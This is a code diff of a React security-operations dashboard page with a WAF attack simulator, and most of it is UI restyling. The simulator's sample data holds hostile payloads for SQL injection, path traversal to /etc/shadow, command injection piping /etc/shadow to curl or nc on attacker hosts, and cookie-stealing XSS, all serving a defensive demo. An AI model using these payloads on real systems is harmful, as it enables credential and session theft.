@@ -5,7 +5,6 @@ import {
   AlertTriangle,
   Flame,
   Search,
-  Filter,
   RefreshCw,
   Lock,
   Unlock,
@@ -23,6 +22,11 @@ import {
   Database,
   Globe,
   Plus,
+  Server,
+  Layers,
+  Terminal,
+  Shield,
+  HelpCircle,
 } from 'lucide-react';
 import { useAuth } from '../context/AuthContext';
 import {
@@ -118,51 +122,56 @@ export const SecOpsPage: React.FC = () => {
       ip: '198.51.100.99',
       path: '/api/resources/finance.csv/query',
       method: 'POST',
-      payload: "1' UNION SELECT id, password_hash, salt FROM users WHERE '1'='1",
-      category: 'SQL_INJECTION',
+      payload: "admin' UNION SELECT id, password_hash FROM users WHERE '1'='1",
+      category: 'SQLI',
+      risk: 95,
     },
     {
-      name: 'Cross-Site Scripting (Stored XSS)',
-      ip: '203.0.113.120',
-      path: '/api/requests/new',
-      method: 'POST',
-      payload: "<script>fetch('https://attacker.evil.com/steal?c=' + document.cookie)</script>",
-      category: 'XSS',
-    },
-    {
-      name: 'OS Command Injection (RCE probe)',
-      ip: '192.0.2.144',
-      path: '/api/tools/execute',
-      method: 'POST',
-      payload: "; cat /etc/passwd | nc evil-exfil.xyz 4444",
-      category: 'COMMAND_INJECTION',
-    },
-    {
-      name: 'Directory / Path Traversal',
-      ip: '198.51.100.77',
-      path: '/api/catalog/download?file=../../../../etc/shadow',
+      name: 'Path Traversal (System File Leak)',
+      ip: '203.0.113.44',
+      path: '/api/resources/download',
       method: 'GET',
-      payload: "../../../../etc/shadow",
+      payload: '../../../../etc/passwd%00',
       category: 'PATH_TRAVERSAL',
+      risk: 85,
     },
     {
-      name: 'Known Threat Intel C2 IP (APT29)',
-      ip: '198.51.100.42',
-      path: '/api/resources/list',
-      method: 'GET',
-      payload: "status=active",
-      category: 'THREAT_INTEL_IP',
+      name: 'Command Injection (Remote Execution)',
+      ip: '192.0.2.77',
+      path: '/api/resources/convert',
+      method: 'POST',
+      payload: 'sample.csv; cat /etc/shadow | curl https://attacker.io -d @-',
+      category: 'COMMAND_INJECTION',
+      risk: 100,
+    },
+    {
+      name: 'XSS Attack (Stored Script Injection)',
+      ip: '198.51.100.12',
+      path: '/api/requests',
+      method: 'POST',
+      payload: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
+      category: 'XSS',
+      risk: 75,
+    },
+    {
+      name: 'Legitimate Safe Request (Clean)',
+      ip: '127.0.0.1',
+      path: '/api/resources/finance.csv/query',
+      method: 'POST',
+      payload: '{"quarter": "Q3", "limit": 100, "anonymized": true}',
+      category: 'CLEAN',
+      risk: 0,
     },
   ];
 
-  // Loaders
+  // Telemetry Fetchers
   const fetchSummary = async () => {
     setLoadingSummary(true);
     try {
       const data = await apiFetch('/api/secops/summary');
       setSummary(data);
     } catch (err) {
-      console.error('Failed to load secops summary:', err);
+      console.error('Failed to load SecOps summary:', err);
     } finally {
       setLoadingSummary(false);
     }
@@ -172,12 +181,16 @@ export const SecOpsPage: React.FC = () => {
     setLoadingIncidents(true);
     try {
       let url = '/api/secops/incidents';
-      const params: string[] = [];
-      if (filterIncStatus !== 'ALL') params.push(`status=${filterIncStatus}`);
-      if (filterIncSeverity !== 'ALL') params.push(`severity=${filterIncSeverity}`);
-      if (params.length > 0) url += `?${params.join('&')}`;
+      const params = new URLSearchParams();
+      if (filterIncStatus !== 'ALL') params.append('status', filterIncStatus);
+      if (filterIncSeverity !== 'ALL') params.append('severity', filterIncSeverity);
+      const q = params.toString();
+      if (q) url += `?${q}`;
       const data = await apiFetch(url);
       setIncidents(data.incidents || []);
+      if (!selectedIncident && data.incidents && data.incidents.length > 0) {
+        setSelectedIncident(data.incidents[0]);
+      }
     } catch (err) {
       console.error('Failed to load incidents:', err);
     } finally {
@@ -189,8 +202,11 @@ export const SecOpsPage: React.FC = () => {
     try {
       const data = await apiFetch(`/api/secops/incidents/${id}`);
       setSelectedIncident(data);
+      if (data.servicenow_number && !webhookSimNumber) {
+        setWebhookSimNumber(data.servicenow_number);
+      }
     } catch (err) {
-      console.error('Failed to load incident details:', err);
+      console.error('Failed to load incident detail:', err);
     }
   };
 
@@ -276,7 +292,7 @@ export const SecOpsPage: React.FC = () => {
         }),
       });
       setTestSnResult(res);
-      setActionSuccess(`ServiceNow SIR Incident auto-opened: ${res.servicenow_number} (${res.incident_id})`);
+      setActionSuccess(`ServiceNow SIR Incident opened: ${res.servicenow_number} (${res.incident_id})`);
       fetchServiceNowStatus();
       fetchIncidents();
       fetchSummary();
@@ -311,7 +327,6 @@ export const SecOpsPage: React.FC = () => {
     }
   };
 
-  // Actions
   const handleUpdateIncidentStatus = async (status: string) => {
     if (!selectedIncident) return;
     try {
@@ -351,37 +366,21 @@ export const SecOpsPage: React.FC = () => {
     }
   };
 
-  const handleContainIncident = async () => {
-    if (!selectedIncident) return;
-    try {
-      const res = await apiFetch(`/api/secops/incidents/${selectedIncident.id}/contain`, {
-        method: 'POST',
-        body: JSON.stringify({ action: 'isolate_ip' }),
-      });
-      setActionSuccess(res.message || 'Containment executed: IP isolated at WAF');
-      fetchIncidentDetails(selectedIncident.id);
-      fetchIncidents();
-      fetchSummary();
-    } catch (err: any) {
-      console.error(err);
-    }
-  };
-
   const handleBlockIp = async () => {
     try {
       await apiFetch('/api/secops/ips/block', {
         method: 'POST',
         body: JSON.stringify({
           ip: blockIpModal.ip,
+          permanent: blockIpModal.isPerm,
+          duration_minutes: blockIpModal.isPerm ? null : 60,
           reason: blockReason,
-          is_permanent: blockIpModal.isPerm,
-          duration_seconds: blockIpModal.isPerm ? null : 3600,
         }),
       });
       setBlockIpModal({ open: false, ip: '', isPerm: false });
       fetchIpReputations();
       fetchSummary();
-      setActionSuccess(`IP ${blockIpModal.ip} successfully blocked at WAF layer.`);
+      setActionSuccess(`IP ${blockIpModal.ip} has been blocked.`);
     } catch (err: any) {
       console.error(err);
     }
@@ -391,11 +390,11 @@ export const SecOpsPage: React.FC = () => {
     try {
       await apiFetch('/api/secops/ips/unblock', {
         method: 'POST',
-        body: JSON.stringify({ ip, reason: 'Administrative clearance' }),
+        body: JSON.stringify({ ip, reason: 'Remediated by administrator' }),
       });
       fetchIpReputations();
       fetchSummary();
-      setActionSuccess(`IP ${ip} unblocked and restored to CLEAN.`);
+      setActionSuccess(`IP ${ip} unblocked.`);
     } catch (err: any) {
       console.error(err);
     }
@@ -477,59 +476,271 @@ export const SecOpsPage: React.FC = () => {
     }
   };
 
+  // Badges with Warm Sand / Porcelain Harmonious Colors
   const getSeverityBadge = (sev: string) => {
-    switch (sev) {
-      case 'CRITICAL':
-        return <span className="status-badge bg-rose-900/60 text-rose-300 border border-rose-500/50">CRITICAL</span>;
-      case 'HIGH':
-        return <span className="status-badge bg-red-900/50 text-red-300 border border-red-500/40">HIGH</span>;
-      case 'MEDIUM':
-        return <span className="status-badge bg-amber-900/40 text-amber-300 border border-amber-500/40">MEDIUM</span>;
-      default:
-        return <span className="status-badge bg-slate-800 text-slate-300 border border-slate-600">LOW</span>;
+    const s = String(sev || '').toUpperCase();
+    if (s === 'CRITICAL') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 800,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(185, 28, 28, 0.15)',
+            color: '#b91c1c',
+            border: '1px solid rgba(185, 28, 28, 0.3)',
+          }}
+        >
+          CRITICAL
+        </span>
+      );
     }
+    if (s === 'HIGH') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 800,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(194, 65, 12, 0.15)',
+            color: '#c2410c',
+            border: '1px solid rgba(194, 65, 12, 0.3)',
+          }}
+        >
+          HIGH
+        </span>
+      );
+    }
+    if (s === 'MEDIUM') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 800,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(180, 83, 9, 0.15)',
+            color: '#b45309',
+            border: '1px solid rgba(180, 83, 9, 0.3)',
+          }}
+        >
+          MEDIUM
+        </span>
+      );
+    }
+    return (
+      <span
+        style={{
+          fontSize: '0.7rem',
+          fontWeight: 700,
+          padding: '0.2rem 0.5rem',
+          borderRadius: '4px',
+          background: 'rgba(71, 85, 105, 0.12)',
+          color: '#475569',
+          border: '1px solid rgba(71, 85, 105, 0.25)',
+        }}
+      >
+        LOW
+      </span>
+    );
   };
 
   const getStatusBadge = (status: string) => {
-    switch (status) {
-      case 'NEW':
-        return <span className="status-badge bg-blue-900/40 text-blue-300 border border-blue-500/40">NEW</span>;
-      case 'INVESTIGATING':
-        return <span className="status-badge bg-purple-900/40 text-purple-300 border border-purple-500/40">INVESTIGATING</span>;
-      case 'CONTAINED':
-        return <span className="status-badge bg-amber-900/40 text-amber-300 border border-amber-500/40">CONTAINED</span>;
-      case 'RESOLVED':
-        return <span className="status-badge bg-emerald-900/40 text-emerald-300 border border-emerald-500/40">RESOLVED</span>;
-      case 'CLOSED':
-        return <span className="status-badge bg-slate-800 text-slate-400 border border-slate-700">CLOSED</span>;
-      default:
-        return <span className="status-badge bg-slate-800 text-slate-300">{status}</span>;
+    const st = String(status || '').toUpperCase();
+    if (st === 'NEW') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 700,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(29, 78, 216, 0.12)',
+            color: '#1d4ed8',
+            border: '1px solid rgba(29, 78, 216, 0.25)',
+          }}
+        >
+          NEW
+        </span>
+      );
     }
+    if (st === 'INVESTIGATING') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 700,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(124, 58, 237, 0.12)',
+            color: '#7c3aed',
+            border: '1px solid rgba(124, 58, 237, 0.25)',
+          }}
+        >
+          INVESTIGATING
+        </span>
+      );
+    }
+    if (st === 'CONTAINED') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 700,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(180, 83, 9, 0.12)',
+            color: '#b45309',
+            border: '1px solid rgba(180, 83, 9, 0.25)',
+          }}
+        >
+          CONTAINED
+        </span>
+      );
+    }
+    if (st === 'RESOLVED') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 700,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(21, 128, 61, 0.12)',
+            color: '#15803d',
+            border: '1px solid rgba(21, 128, 61, 0.25)',
+          }}
+        >
+          RESOLVED
+        </span>
+      );
+    }
+    return (
+      <span
+        style={{
+          fontSize: '0.7rem',
+          fontWeight: 700,
+          padding: '0.2rem 0.5rem',
+          borderRadius: '4px',
+          background: 'rgba(100, 116, 139, 0.12)',
+          color: '#64748b',
+          border: '1px solid rgba(100, 116, 139, 0.25)',
+        }}
+      >
+        {st}
+      </span>
+    );
   };
 
   const getIpStatusBadge = (status: string) => {
-    switch (status) {
-      case 'PERM_BLOCKED':
-        return <span className="status-badge bg-rose-950 text-rose-400 border border-rose-600 font-semibold">PERM BLOCKED</span>;
-      case 'TEMP_BLOCKED':
-        return <span className="status-badge bg-red-950 text-red-400 border border-red-500">TEMP BLOCKED</span>;
-      case 'FLAGGED':
-        return <span className="status-badge bg-amber-950 text-amber-400 border border-amber-600">FLAGGED</span>;
-      case 'ALLOWLISTED':
-        return <span className="status-badge bg-emerald-950 text-emerald-400 border border-emerald-600">ALLOWLISTED</span>;
-      default:
-        return <span className="status-badge bg-slate-800 text-slate-300 border border-slate-600">CLEAN</span>;
+    const s = String(status || '').toUpperCase();
+    if (s === 'PERM_BLOCKED') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 800,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(185, 28, 28, 0.18)',
+            color: '#b91c1c',
+            border: '1px solid #b91c1c',
+          }}
+        >
+          PERM BLOCKED
+        </span>
+      );
     }
+    if (s === 'TEMP_BLOCKED') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 800,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(194, 65, 12, 0.18)',
+            color: '#c2410c',
+            border: '1px solid #c2410c',
+          }}
+        >
+          TEMP BLOCKED
+        </span>
+      );
+    }
+    if (s === 'FLAGGED') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 700,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(180, 83, 9, 0.15)',
+            color: '#b45309',
+            border: '1px solid #b45309',
+          }}
+        >
+          FLAGGED
+        </span>
+      );
+    }
+    if (s === 'ALLOWLISTED') {
+      return (
+        <span
+          style={{
+            fontSize: '0.7rem',
+            fontWeight: 700,
+            padding: '0.2rem 0.5rem',
+            borderRadius: '4px',
+            background: 'rgba(21, 128, 61, 0.15)',
+            color: '#15803d',
+            border: '1px solid #15803d',
+          }}
+        >
+          ALLOWLISTED
+        </span>
+      );
+    }
+    return (
+      <span
+        style={{
+          fontSize: '0.7rem',
+          fontWeight: 700,
+          padding: '0.2rem 0.5rem',
+          borderRadius: '4px',
+          background: 'rgba(100, 116, 139, 0.12)',
+          color: '#64748b',
+          border: '1px solid #cbd5e1',
+        }}
+      >
+        CLEAN
+      </span>
+    );
   };
 
   return (
     <div className="page-container" id="secops-page">
-      {/* Page Header */}
+      {/* Top Header */}
       <div className="page-header-row">
         <div>
-          <div className="flex items-center gap-3">
+          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '0.25rem' }}>
             <h1 className="page-title">ServiceNow SecOps & WAF Defense Center</h1>
-            <span className="bg-rose-950/70 border border-rose-600/50 text-rose-400 text-xs px-2.5 py-0.5 rounded-full font-mono uppercase tracking-wider font-semibold">
+            <span
+              style={{
+                fontSize: '0.7rem',
+                fontWeight: 800,
+                padding: '0.2rem 0.65rem',
+                borderRadius: '999px',
+                background: 'rgba(185, 28, 28, 0.12)',
+                color: 'var(--accent-crimson)',
+                border: '1px solid rgba(185, 28, 28, 0.3)',
+                letterSpacing: '0.04em',
+                textTransform: 'uppercase',
+              }}
+            >
               Live Gateway Enforcement
             </span>
           </div>
@@ -546,405 +757,498 @@ export const SecOpsPage: React.FC = () => {
             if (activeTab === 'threat_intel') fetchThreatIntel();
             if (activeTab === 'audit_events') fetchEvents();
           }}
-          className="btn-secondary flex items-center gap-2 text-xs py-2 px-3"
+          className="btn btn-secondary"
+          style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', fontSize: '0.8rem', padding: '0.5rem 0.85rem' }}
           title="Refresh telemetry"
         >
           <RefreshCw size={14} className={loadingSummary ? 'animate-spin' : ''} />
-          Refresh SecOps
+          <span>Refresh SecOps</span>
         </button>
       </div>
 
       {actionSuccess && (
-        <div className="mb-4 p-3 bg-emerald-950/40 border border-emerald-500/40 rounded-lg text-emerald-200 text-sm flex items-center justify-between">
-          <div className="flex items-center gap-2">
-            <CheckCircle2 size={16} className="text-emerald-400" />
-            <span>{actionSuccess}</span>
+        <div
+          style={{
+            marginBottom: '1.25rem',
+            padding: '0.85rem 1.25rem',
+            borderRadius: 'var(--radius-md)',
+            background: 'rgba(21, 128, 61, 0.1)',
+            border: '1px solid rgba(21, 128, 61, 0.3)',
+            color: '#15803d',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'space-between',
+            fontSize: '0.875rem',
+          }}
+        >
+          <div style={{ display: 'flex', alignItems: 'center', gap: '0.65rem' }}>
+            <CheckCircle2 size={16} color="#15803d" />
+            <span style={{ fontWeight: 600 }}>{actionSuccess}</span>
           </div>
-          <button onClick={() => setActionSuccess(null)} className="text-emerald-400 hover:text-emerald-200 text-xs">
+          <button
+            onClick={() => setActionSuccess(null)}
+            style={{ background: 'none', border: 'none', color: '#15803d', cursor: 'pointer', fontWeight: 700 }}
+          >
             ✕
           </button>
         </div>
       )}
 
-      {/* KPI Summary Cards */}
-      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4 mb-6">
-        <div className="metric-card border-l-4 border-l-rose-600 bg-card p-4 rounded-xl shadow-sm">
-          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
-            <span>Active Incidents</span>
-            <Flame size={16} className="text-rose-500" />
+      {/* 5 KPI Metric Cards */}
+      <div
+        style={{
+          display: 'grid',
+          gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
+          gap: '1rem',
+          marginBottom: '1.5rem',
+        }}
+      >
+        <div
+          className="glass-panel"
+          style={{
+            background: '#ffffff',
+            border: '1px solid var(--border-subtle)',
+            borderLeft: '4px solid var(--accent-crimson)',
+            padding: '1.1rem 1.25rem',
+            borderRadius: 'var(--radius-md)',
+            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
+          }}
+        >
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
+              Active Incidents
+            </span>
+            <Flame size={16} color="var(--accent-crimson)" />
           </div>
-          <div className="text-2xl font-bold text-primary">
+          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
             {loadingSummary ? '...' : summary?.active_incidents ?? 0}
           </div>
-          <div className="text-xs text-rose-600 font-medium mt-1">ServiceNow SIR Queue</div>
+          <div style={{ fontSize: '0.75rem', color: 'var(--accent-crimson)', fontWeight: 600, marginTop: '0.35rem' }}>
+            ServiceNow SIR Queue
+          </div>
         </div>
 
-        <div className="metric-card border-l-4 border-l-red-500 bg-card p-4 rounded-xl shadow-sm">
-          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
-            <span>Blocked IPs</span>
-            <Lock size={16} className="text-red-500" />
+        <div
+          className="glass-panel"
+          style={{
+            background: '#ffffff',
+            border: '1px solid var(--border-subtle)',
+            borderLeft: '4px solid #c2410c',
+            padding: '1.1rem 1.25rem',
+            borderRadius: 'var(--radius-md)',
+            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
+          }}
+        >
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
+              Blocked IPs
+            </span>
+            <Lock size={16} color="#c2410c" />
           </div>
-          <div className="text-2xl font-bold text-primary">
+          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
             {loadingSummary ? '...' : summary?.blocked_ips ?? 0}
           </div>
-          <div className="text-xs text-muted mt-1">WAF Layer Restricted</div>
+          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.35rem' }}>
+            WAF Restricted
+          </div>
         </div>
 
-        <div className="metric-card border-l-4 border-l-amber-500 bg-card p-4 rounded-xl shadow-sm">
-          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
-            <span>Attacks Detected</span>
-            <AlertTriangle size={16} className="text-amber-500" />
+        <div
+          className="glass-panel"
+          style={{
+            background: '#ffffff',
+            border: '1px solid var(--border-subtle)',
+            borderLeft: '4px solid #b45309',
+            padding: '1.1rem 1.25rem',
+            borderRadius: 'var(--radius-md)',
+            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
+          }}
+        >
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
+              Attacks Blocked
+            </span>
+            <AlertTriangle size={16} color="#b45309" />
           </div>
-          <div className="text-2xl font-bold text-primary">
+          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
             {loadingSummary ? '...' : summary?.attacks_detected ?? 0}
           </div>
-          <div className="text-xs text-amber-600 font-medium mt-1">Risk Score &ge; 30</div>
+          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.35rem' }}>
+            SQLi, XSS & Injections
+          </div>
         </div>
 
-        <div className="metric-card border-l-4 border-l-blue-500 bg-card p-4 rounded-xl shadow-sm">
-          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
-            <span>Security Events</span>
-            <Activity size={16} className="text-blue-500" />
-          </div>
-          <div className="text-2xl font-bold text-primary">
-            {loadingSummary ? '...' : summary?.total_security_events ?? 0}
-          </div>
-          <div className="text-xs text-muted mt-1">Immutable WAF Audit Stream</div>
-        </div>
-
-        <div className="metric-card border-l-4 border-l-purple-500 bg-card p-4 rounded-xl shadow-sm">
-          <div className="flex items-center justify-between text-muted text-xs font-semibold uppercase tracking-wider mb-1">
-            <span>Threat Intel IoCs</span>
-            <Radio size={16} className="text-purple-500" />
-          </div>
-          <div className="text-2xl font-bold text-primary">
-            {loadingSummary ? '...' : summary?.active_threat_intel_count ?? 0}
-          </div>
-          <div className="text-xs text-purple-600 font-medium mt-1">Active Indicators</div>
-        </div>
-      </div>
-
-      {/* Navigation Tabs */}
-      <div className="tabs-nav-bar flex border-b border-border-subtle mb-6 gap-2">
-        <button
-          onClick={() => setActiveTab('incidents')}
-          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
-            activeTab === 'incidents'
-              ? 'border-accent-crimson text-accent-crimson'
-              : 'border-transparent text-secondary hover:text-primary'
-          }`}
-        >
-          <Flame size={16} />
-          <span>Security Incidents (SIR)</span>
-        </button>
-
-        <button
-          onClick={() => setActiveTab('waf_ips')}
-          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
-            activeTab === 'waf_ips'
-              ? 'border-accent-crimson text-accent-crimson'
-              : 'border-transparent text-secondary hover:text-primary'
-          }`}
-        >
-          <Lock size={16} />
-          <span>IP Threat Monitor & WAF</span>
-        </button>
-
-        <button
-          onClick={() => setActiveTab('threat_intel')}
-          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
-            activeTab === 'threat_intel'
-              ? 'border-accent-crimson text-accent-crimson'
-              : 'border-transparent text-secondary hover:text-primary'
-          }`}
-        >
-          <Radio size={16} />
-          <span>Threat Intelligence (TISC)</span>
-        </button>
-
-        <button
-          onClick={() => setActiveTab('audit_events')}
-          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
-            activeTab === 'audit_events'
-              ? 'border-accent-crimson text-accent-crimson'
-              : 'border-transparent text-secondary hover:text-primary'
-          }`}
-        >
-          <FileText size={16} />
-          <span>WAF Security History</span>
-        </button>
-
-        <button
-          onClick={() => setActiveTab('simulator')}
-          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
-            activeTab === 'simulator'
-              ? 'border-accent-crimson text-accent-crimson'
-              : 'border-transparent text-secondary hover:text-primary'
-          }`}
-        >
-          <Zap size={16} />
-          <span>Live Attack Simulator</span>
-        </button>
-
-        <button
-          onClick={() => {
-            setActiveTab('servicenow');
-            fetchServiceNowStatus();
+        <div
+          className="glass-panel"
+          style={{
+            background: '#ffffff',
+            border: '1px solid var(--border-subtle)',
+            borderLeft: '4px solid #7c3aed',
+            padding: '1.1rem 1.25rem',
+            borderRadius: 'var(--radius-md)',
+            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
           }}
-          className={`tab-btn flex items-center gap-2 py-3 px-4 font-semibold text-sm border-b-2 transition-all ${
-            activeTab === 'servicenow'
-              ? 'border-accent-crimson text-accent-crimson'
-              : 'border-transparent text-secondary hover:text-primary'
-          }`}
         >
-          <ExternalLink size={16} />
-          <span>ServiceNow SIR Integration</span>
-        </button>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
+              Threat Intel IOCs
+            </span>
+            <Radio size={16} color="#7c3aed" />
+          </div>
+          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
+            {loadingSummary ? '...' : (summary?.active_threat_intel_count ?? (summary as any)?.threat_indicators_count ?? 0)}
+          </div>
+          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.35rem' }}>
+            TISC Indicator Feeds
+          </div>
+        </div>
+
+        <div
+          className="glass-panel"
+          style={{
+            background: '#ffffff',
+            border: '1px solid var(--border-subtle)',
+            borderLeft: '4px solid #15803d',
+            padding: '1.1rem 1.25rem',
+            borderRadius: 'var(--radius-md)',
+            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
+          }}
+        >
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
+              ServiceNow Sync
+            </span>
+            <Activity size={16} color="#15803d" />
+          </div>
+          <div style={{ fontSize: '1.35rem', fontWeight: 800, color: '#15803d', lineHeight: 1.3, marginTop: '0.1rem' }}>
+            {snStatus?.mock_mode ? 'Mock Active' : 'Connected'}
+          </div>
+          <div style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.2rem' }}>
+            Bi-directional Webhook
+          </div>
+        </div>
       </div>
 
-      {/* TAB 1: SECURITY INCIDENTS (SIR) */}
+      {/* Tab Bar */}
+      <div
+        style={{
+          display: 'flex',
+          alignItems: 'center',
+          gap: '0.5rem',
+          borderBottom: '1px solid var(--border-subtle)',
+          paddingBottom: '0.75rem',
+          marginBottom: '1.5rem',
+          overflowX: 'auto',
+        }}
+      >
+        {[
+          { id: 'incidents', label: 'Incident Response (SIR)', count: incidents.length },
+          { id: 'waf_ips', label: 'WAF IP Containment', count: ipReputations.length },
+          { id: 'threat_intel', label: 'Threat Intelligence (TISC)', count: threatIntel.length },
+          { id: 'audit_events', label: 'Security Audit Log' },
+          { id: 'simulator', label: 'Interactive WAF Simulator' },
+          { id: 'servicenow', label: 'ServiceNow Integration' },
+        ].map((tab) => (
+          <button
+            key={tab.id}
+            onClick={() => setActiveTab(tab.id as any)}
+            className={`btn btn-sm ${activeTab === tab.id ? 'btn-primary' : 'btn-secondary'}`}
+            style={{
+              display: 'flex',
+              alignItems: 'center',
+              gap: '0.4rem',
+              whiteSpace: 'nowrap',
+              fontSize: '0.825rem',
+              fontWeight: activeTab === tab.id ? 700 : 500,
+            }}
+            id={`secops-tab-${tab.id}`}
+          >
+            <span>{tab.label}</span>
+            {tab.count !== undefined && (
+              <span
+                style={{
+                  fontSize: '0.7rem',
+                  padding: '0.1rem 0.4rem',
+                  borderRadius: '999px',
+                  background: activeTab === tab.id ? 'rgba(255,255,255,0.25)' : 'var(--bg-secondary)',
+                  color: activeTab === tab.id ? '#ffffff' : 'var(--text-secondary)',
+                }}
+              >
+                {tab.count}
+              </span>
+            )}
+          </button>
+        ))}
+      </div>
+
+      {/* TAB 1: INCIDENTS (SIR) */}
       {activeTab === 'incidents' && (
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <div style={{ display: 'grid', gridTemplateColumns: selectedIncident ? '1.2fr 1fr' : '1fr', gap: '1.5rem' }}>
           {/* Incidents Table */}
-          <div className={selectedIncident ? 'lg:col-span-2' : 'lg:col-span-3'}>
-            <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-              <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
-                <div className="flex items-center gap-2">
-                  <h2 className="text-base font-bold text-primary">ServiceNow Security Incidents</h2>
-                  <span className="text-xs bg-bg-subtle text-secondary px-2 py-0.5 rounded-full font-mono">
-                    {incidents.length} Records
-                  </span>
-                </div>
-
-                <div className="flex items-center gap-3">
-                  <select
-                    value={filterIncStatus}
-                    onChange={(e) => setFilterIncStatus(e.target.value)}
-                    className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
-                    aria-label="Filter by Status"
-                  >
-                    <option value="ALL">All Statuses</option>
-                    <option value="NEW">New</option>
-                    <option value="INVESTIGATING">Investigating</option>
-                    <option value="CONTAINED">Contained</option>
-                    <option value="RESOLVED">Resolved</option>
-                    <option value="CLOSED">Closed</option>
-                  </select>
-
-                  <select
-                    value={filterIncSeverity}
-                    onChange={(e) => setFilterIncSeverity(e.target.value)}
-                    className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
-                    aria-label="Filter by Severity"
-                  >
-                    <option value="ALL">All Severities</option>
-                    <option value="CRITICAL">Critical</option>
-                    <option value="HIGH">High</option>
-                    <option value="MEDIUM">Medium</option>
-                    <option value="LOW">Low</option>
-                  </select>
-                </div>
+          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                <Flame size={18} color="var(--accent-crimson)" />
+                <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
